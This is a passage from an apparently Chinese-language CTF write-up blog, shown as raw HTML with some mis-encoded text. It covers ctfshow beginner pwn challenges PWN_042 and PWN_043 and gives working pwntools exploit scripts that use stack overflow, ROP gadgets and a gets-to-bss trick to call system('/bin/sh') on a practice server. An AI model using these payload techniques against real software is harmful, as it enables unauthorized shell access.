&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80487BA&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_042&#34;&gt;PWN_042
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½çš„ system(); ä½†æ˜¯æ²¡&amp;quot;/bin/sh&amp;quot; ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_042&#34; &gt;PWN_042&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ¥çœ‹IDA64ä½åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128.png&#34;
	width=&#34;670&#34;
	height=&#34;180&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128_hu_773d0a462a9bb4a6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128_hu_8acb802bbfbe83f2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;å­˜åœ¨æ ˆæº¢å‡º&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;372&#34;
		data-flex-basis=&#34;893px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129.png&#34;
	width=&#34;946&#34;
	height=&#34;234&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129_hu_720d126d72ab49b9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129_hu_e7d4450d3040833.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;404&#34;
		data-flex-basis=&#34;970px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è·Ÿè¿›hintå‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå’ŒPWN_041ä¸€æ ·çš„ï¼Œè¿™æ¬¡ç¨‹åºæ˜¯64ä½ï¼Œ&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/#32%e4%bd%8d%e5%92%8c64%e4%bd%8d%e5%8f%af%e6%89%a7%e8%a1%8c%e7%a8%8b%e5%ba%8f%e7%9a%84%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92%e9%a1%ba%e5%ba%8f&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;åœ¨expç¼–å†™ä¸Šæœ‰æ‰€ä¸åŒ&lt;/a&gt;ï¼Œéœ€è¦pop_rdiï¼šretã€retçš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130.png&#34;
	width=&#34;1265&#34;
	height=&#34;375&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130_hu_5a7538fd605e720d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130_hu_a866cc865737ff56.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;809px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;retï¼š0x40053e&lt;/p&gt;
&lt;p&gt;pop_rdiï¼š0x400843&lt;/p&gt;
&lt;p&gt;å†æ‰¾shçš„åœ°å€å§ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131.png&#34;
	width=&#34;1096&#34;
	height=&#34;204&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131_hu_6a6662067bbd0f05.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131_hu_9a6c214336b69472.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;shçš„åœ°å€æ˜¯0x400872&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;537&#34;
		data-flex-basis=&#34;1289px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28281&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400872&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40053e&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400843&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;flagå°±ä¸ç»™äº†ï¼Œå› ä¸ºé¶æœºç»™çš„flagæ˜¯åŠ¨æ€çš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_043&#34;&gt;PWN_043
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡&amp;quot;/bin/sh&amp;quot; ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_043&#34; &gt;PWN_043&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDA32ä½è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132.png&#34;
	width=&#34;875&#34;
	height=&#34;151&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132_hu_c59120af2cb1695a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132_hu_cb4a8ac9d3d15d72.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;getsæ ˆæº¢å‡º&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;579&#34;
		data-flex-basis=&#34;1390px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;getså‡½æ•°å¾ˆå±é™©çš„ï¼Œä¸€èˆ¬éƒ½ç”¨fgetsï¼Œç”¨è¿™ä¸ªå¿…æº¢å‡ºçš„å¥½å§&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›hintå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133.png&#34;
	width=&#34;896&#34;
	height=&#34;339&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133_hu_6591d04ae9fff383.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133_hu_7fceb86594aae882.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;264&#34;
		data-flex-basis=&#34;634px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å‘ç°äº†systemå‡½æ•°ï¼Œä½†å´ä¸æä¾›shã€/bin/shç»™æˆ‘ä»¬ï¼Œåªèƒ½åˆ©ç”¨getså‡½æ•°ã€‚ï¼ˆgetså‡½æ•°è¿›è¡Œè¯»å…¥æ•°æ®ï¼Œå®ƒå¯ä»¥æ— é™è¯»å–åˆ°&lt;strong&gt;å†…å­˜&lt;/strong&gt;ï¼Œä¸ä¼šåˆ¤æ–­ä¸Šé™ï¼Œå¯ä»¥åŒ…å«ç©ºæ ¼ï¼Œä»¥å›è½¦ç»“æŸè¯»å–ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨äº†æ˜æ˜¾çš„æº¢å‡ºï¼‰&lt;/p&gt;
&lt;p&gt;é‚£å¤§è‡´çš„expæ€è·¯æ¥äº†ï¼›å…ˆç”¨cyclicäº§ç”Ÿåƒåœ¾å€¼å¡«å……ç¼“å†²åŒºå’Œebpæœ¬èº«ï¼Œå‡ºç°æ ˆæº¢å‡ºåï¼Œå°†è¿”å›å€¼è¦†ç›–ä¸ºgetså‡½æ•°åœ°å€ï¼ŒåŠ ä¸Šebxå¯„å­˜å™¨å¼¹æ ˆï¼Œgetså‡½æ•°è¯»å–æ•°æ®ï¼ŒæŠŠæˆ‘ä»¬æ‰€ç»™çš„/bin/shå­—ç¬¦ä¸²å†™å…¥è¿™ä¸ªå†…å­˜é‡Œé¢ï¼Œå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸º system å‡½æ•°çš„åœ°å€ï¼Œä½¿å¾— gets æ‰§è¡Œå®Œåï¼Œç¨‹åºè‡ªåŠ¨è·³è½¬åˆ° system æ‰§è¡Œï¼Œæ‰§è¡Œ &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; è·å– shellã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå†…å­˜å»å“ªæ‰¾ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åœ¨bsså­—æ®µï¼ˆæœªåˆå§‹åŒ–å­—æ®µï¼‰æ‰¾åˆ°äº†buf2å˜é‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134.png&#34;
	width=&#34;929&#34;
	height=&#34;215&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134_hu_e07f711cd6a6e5ef.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134_hu_4dc65a9b43ad1b81.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;buf2ï¼šæœªå®šä¹‰çš„å†…å­˜å˜é‡&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;432&#34;
		data-flex-basis=&#34;1037px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢pop_ebxçš„åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135.png&#34;
	width=&#34;1245&#34;
	height=&#34;505&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135_hu_d45e675ff438bc16.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135_hu_c1d3ce761cd87966.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;pop_ebxçš„åœ°å€æ˜¯0x8048409&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;246&#34;
		data-flex-basis=&#34;591px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28152&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gets&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_ebx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048409&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;buf2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
